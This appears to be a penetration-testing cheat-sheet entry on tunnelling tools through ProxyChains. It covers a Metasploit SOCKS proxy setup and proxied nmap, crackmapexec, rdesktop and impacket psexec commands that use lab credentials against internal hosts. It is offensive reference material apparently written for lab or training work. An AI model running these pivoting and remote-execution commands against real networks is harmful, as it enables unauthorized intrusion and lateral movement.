---
title: ProxyChains Configuration
category: tunnels
subcategory: ssh
os: linux
command: proxychains nmap target
tools: proxychains
---


### Config file

```bash
cat /etc/proxychains4.conf
```

Append your SOCKS endpoint:

```
[ProxyList]
socks5 127.0.0.1 1080
```

### Metasploit SOCKS proxy

```
use auxiliary/server/socks_proxy
set VERSION 4
set SRVPORT 9050
run
```

### Tool examples through ProxyChains

```bash
proxychains nmap 10.4.26.4 -sT -Pn -sV -p 445
proxychains crackmapexec smb 172.16.242.0/24 -u svc-auth -p secure_t1 2>/dev/null
proxychains rdesktop 172.16.242.176 -u svc-auth -p secure_t1 -d offsec.live -g 90%
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py svc-auth:secure_t1@172.16.242.176
```
